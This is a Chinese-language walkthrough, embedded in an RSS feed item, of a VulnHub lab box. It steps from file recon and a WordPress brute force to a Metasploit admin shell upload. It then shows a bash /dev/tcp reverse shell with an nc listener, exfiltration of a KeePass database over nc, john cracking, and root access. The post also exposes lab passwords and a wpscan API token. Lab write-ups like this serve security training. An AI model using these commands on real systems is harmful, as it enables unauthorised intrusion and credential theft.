-&lt;h3 id=&#34;智力游戏解谜1&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#智力游戏解谜1&#34;&gt;#&lt;/a&gt; 智力游戏解谜 1&lt;/h3&gt;
-&lt;p&gt;打开 http://192.168.31.29:66/ 进行信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-954.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;看到有个地址可以直接下载项目地址，这里我们直接点击下载&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-955.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;这么多文件，一眼看去只有几个是 1.18 号的文件，先对这几个文件测试&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-956.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;按日期这一列对这些文件进行排序，输入如下命令  &lt;code&gt;ls -Alh | sort -k 7&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-957.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;接下来就依次看看这几个文件  &lt;code&gt;cat assets/* | sort | uniq&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-958.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;一堆乱码，是没有价值的信息 &lt;code&gt;cat index.md&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-959.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;这个文件没有有价值的信息 &lt;code&gt;cat _vvmlist | sort | uniq&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-960.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 在这个文件中找到了一个 wordpress 的站点&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-961.png&#34; width=&#34;320&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;wordpress-渗透测试&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#wordpress-渗透测试&#34;&gt;#&lt;/a&gt; wordpress 渗透测试&lt;/h3&gt;
-&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjkvbHlyaWNzYmxvZw==&#34;&gt;http://192.168.31.29/lyricsblog&lt;/span&gt; 进行信息收集&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-962.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;直接用 wpscan 工具对 wordpress 站点进行扫描&lt;br&gt;
- &lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.29/lyricsblog/ -e&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-963.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;得到一个用户名 erdalkomurcu&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-964.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;指定用户为 erdalkomurcu 进行密码爆破&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;wpscan --api-token eG5iT4ooiuP7eVJVedsHhlgx8xeZHmAJjBr13asnjEc --url http://192.168.31.29/lyricsblog/ -U erdalkomurcu -P /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-965.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;密码爆破了很长时间都没成功，可能是一个复杂密码&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-966.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;从工具出发没有找到，那么我们就从常规的目录扫描进行测试&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-967.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;一些常规的目录，没有什么特殊的，就是有一个 login 地址&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-968.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 既然工具和目录扫描都没有发现可疑的信息，可以尝试去检查一些源代码，看看靶机作者有没有遗留一些提示给我们&lt;/p&gt;
-&lt;h3 id=&#34;智力游戏解谜2&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#智力游戏解谜2&#34;&gt;#&lt;/a&gt; 智力游戏解谜 2&lt;/h3&gt;
-&lt;p&gt;查看 wordpress 首页的源代码 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTkvbHlyaWNzYmxvZy8=&#34;&gt;http://192.168.31.19/lyricsblog/&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-969.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;访问这个网址，得到一个文件: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMjkvbHlyaWNzYmxvZy95ZXNtYW4ucG5n&#34;&gt;http://192.168.31.29/lyricsblog/yesman.png&lt;/span&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-970.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;blockquote&gt;
-&lt;p&gt;线索到这里就断了，这个图片并没有什么利用价值。但是我们可以肯定的是，线索一定是存在在 wordpres 这个站点上的。接下来我们就手动翻一翻网页，看面有没有什么线索。观察上边的图片，对比在站点上找到的页面，发现了一个巧合点，此图片顶头有个 YES,I ENJOY HAKAN TASIYAN, 网页上有一段标题为 Hakan Taşıyan – Doktor 可能突破点就在于这个点。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-971.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;进到这个页面之后，这里有三段文字&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-972.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;是不是有联系，将不带标题的段落文本复制到文本文件中并保存，计算并检查 MD5 消息摘要&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-973.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;在后台处尝试登陆，用户名为 wpscan 破解出来的，密码就用此 md5 数据&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-974.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;登陆失败，将 md5 数据由小写变为大写再次尝试&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;cat md5.txt | awk &#39;&amp;#123;print toupper($0)&amp;#125;&#39; &amp;gt;&amp;gt; MD5.txt&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-975.png&#34; width=&#34;450&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;再次登陆此网址 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTkvbHlyaWNzYmxvZy93cC1sb2dpbi5waHA=&#34;&gt;http://192.168.31.19/lyricsblog/wp-login.php&lt;/span&gt;&lt;br&gt;
- 由密码 BC78C6AB38E114D6135409E44F7CDDA2 成功进入&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-976.png&#34; width=&#34;250&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;后台页面显示如下&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-977.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;msf攻击wordpress&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#msf攻击wordpress&#34;&gt;#&lt;/a&gt; msf 攻击 wordpress&lt;/h3&gt;
-&lt;p&gt;可以搜索 wordpress 相关版本查看相关漏洞，查看版本之后用 msf 反弹 shell&lt;/p&gt;
-&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;use exploit/unix/webapp/wp_admin_shell_upload&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set password BC78C6AB38E114D6135409E44F7CDDA2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set rhosts 192.168.31.29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set username erdalkomurcu&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;set targeturi /lyricsblog&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-978.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;options 检查如下参数&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-979.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;run 开始执行 wordpress 的攻击，成功拿到靶机的 webshell&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-980.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;meterpreter反弹shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#meterpreter反弹shell&#34;&gt;#&lt;/a&gt; meterpreter 反弹 shell&lt;/h3&gt;
-&lt;p&gt;将 msf 的 shell 反弹出来进行美化便于操作&lt;br&gt;
- &lt;code&gt;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/192.168.31.75/4445 0&amp;gt;&amp;amp;1&#39;&lt;/code&gt; &lt;br&gt;
- &lt;code&gt;nc -lvvp 4445&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-981.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;h3 id=&#34;keepass-密码破解&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#keepass-密码破解&#34;&gt;#&lt;/a&gt; keepass 密码破解&lt;/h3&gt;
-&lt;p&gt;翻阅服务器的相关文件，看到 config 配置文件，找到了数据库用户名和密码，并且 /etc/passwd 中是用 raphael 这个用户的  &lt;code&gt;su raphael:_double_trouble_&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-982.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
-&lt;blockquote&gt;
-&lt;p&gt;注意到此用户根目录下有一个隐藏文件.chadroot.kdbx,KeePass 是一款免费的开源密码管理器，可帮助您以安全的方式管理您的密码。您可以将所有密码存储在一个数据库中，该数据库由主密钥锁定。因此，您只需记住一个主密钥即可解锁整个数据库。数据库文件使用目前已知的最佳和最安全的加密算法（AES- 256 、ChaCha20 和 Twofish）进行加密。&lt;/p&gt;
-&lt;/blockquote&gt;
-&lt;p&gt;Keepass 存在漏洞，把其传到 kali 机器上，有多种传输方式&lt;/p&gt;
-&lt;ul&gt;
-&lt;li&gt;scp  &lt;code&gt;scp -P22 parallels@192.168.31.73:/home/parallels/Desktop/tmp/.chadroot.kdbx .&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-983.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;ul&gt;
-&lt;li&gt;nc  &lt;code&gt;nc 192.168.31.73 4446 &amp;lt; .chadroot.kdbx&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-984.png&#34; width=&#34;470&#34; alt=&#34;Image&#34;&gt;
-&lt;ul&gt;
-&lt;li&gt;wget  &lt;code&gt;python3 -m http.server 8000&lt;/code&gt;   &lt;code&gt;wget 192.168.31.29/.chadroot.kdbx -O 2.kdbx&lt;/code&gt;&lt;/li&gt;
-&lt;/ul&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-985.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;用 keepass2john 将 kdbx 后缀的文件转化为 john 能破解的格式并破解&lt;/p&gt;
-&lt;p&gt;&lt;code&gt;keepass2john .chadroot.kdbx &amp;gt; chadroot&lt;/code&gt; &lt;br&gt;
- &lt;code&gt;john --wordlist=/usr/share/wordlists/rockyou.txt chadroot&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-986.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 此处破解的密码应该是：chatter&lt;/p&gt;
-&lt;p&gt;登陆网站 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9hcHAua2Vld2ViLmluZm8v&#34;&gt;https://app.keeweb.info/&lt;/span&gt; 输入 chatter 进入&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-987.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;得到如下界面，每一个页面里边都有一个 root 对应的密码，这四个密码分别是&lt;br&gt;
- &lt;code&gt;.:.yarak.:.&lt;/code&gt;   &lt;code&gt;sercertservice&lt;/code&gt;   &lt;code&gt;.:.subjective.:.&lt;/code&gt;   &lt;code&gt;rockyou.txt&lt;/code&gt;&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-988.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-989.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;在服务器里边分别尝试这四个 root 的密码是否正确&lt;/p&gt;
-&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-990.png&#34; width=&#34;370&#34; alt=&#34;Image&#34;&gt;
-&lt;p&gt;-&amp;gt; 输入密码.:.subjective.:. 时成功拿到 root 权限&lt;/p&gt;
  ]]></description>
         </item>
     </channel>
